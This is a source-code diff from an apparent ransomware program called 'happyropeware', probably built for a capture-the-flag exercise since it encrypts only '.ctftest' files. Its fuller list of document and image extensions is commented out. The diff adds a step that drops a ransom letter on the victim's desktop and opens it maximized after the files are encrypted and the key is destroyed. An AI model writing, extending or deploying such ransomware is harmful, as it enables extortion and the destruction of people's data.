@@ -7,8 +7,9 @@ use anyhow::{anyhow, bail, Result};
 use cipher::PerVictimKey;
 use single_instance::SingleInstance;
 use skip_error::{skip_error_and_debug, SkipError};
-use std::fs::File;
+use windows::Win32::UI::Shell::ShellExecuteW;
 use std::fs;
+use std::fs::File;
 use std::io::Write;
 use std::path::{Path, PathBuf};
 use std::sync::mpsc;
@@ -31,9 +32,7 @@ const RANSOM_LETTER_FILE_NAME: &'static str = "README_ALL_YOUR_FILES_ARE_BELONG_
 //     "txt", "doc", "docx", "jpg", "png", "bmp", "7z", "zip", "rar", "sav", "py", "js", "ppt",
 //     "pptx", "xls", "xlsx",
 // ];
-const EXTENSION_TO_ENCRYPT: &'static [&'static str] = &[
-    "ctftest",
-];
+const EXTENSION_TO_ENCRYPT: &'static [&'static str] = &["ctftest"];
 const QUEUE_SIZE: usize = 1024;
 
 fn get_computer_name() -> Result<String> {
@@ -212,6 +211,21 @@ fn the_boring_loop(key: &PerVictimKey) -> Result<()> {
     Ok(())
 }
 
+fn try_show_ransom_letter_on_desktop(victim_key: &PerVictimKey) -> Result<()> {
+    if let Some(desktop_dir) = directories::UserDirs::new()
+        .expect("UserDirs must work if we got here")
+        .desktop_dir()
+    {
+        drop_ransom_letter(desktop_dir, &victim_key)?;
+        let filename = U16CString::from_os_str(desktop_dir.join(RANSOM_LETTER_FILE_NAME))?;
+        let lpfile = windows::core::PCWSTR::from_raw(filename.as_ptr());
+        unsafe {
+            ShellExecuteW(None, w!("open"), lpfile, None, None, SW_SHOWMAXIMIZED);
+        }
+    }
+    Ok(())
+}
+
 fn main() -> Result<()> {
     assert_precondition();
     let holder = SingleInstance::new("happyropeware-dc52184435e51deee395")?;
@@ -222,5 +236,6 @@ fn main() -> Result<()> {
     let victim_key = key_mgmt::ensure_key()?;
     the_boring_loop(&victim_key)?;
     key_mgmt::destroy_key()?;
+    try_show_ransom_letter_on_desktop(&victim_key).ok();
     Ok(())
 }
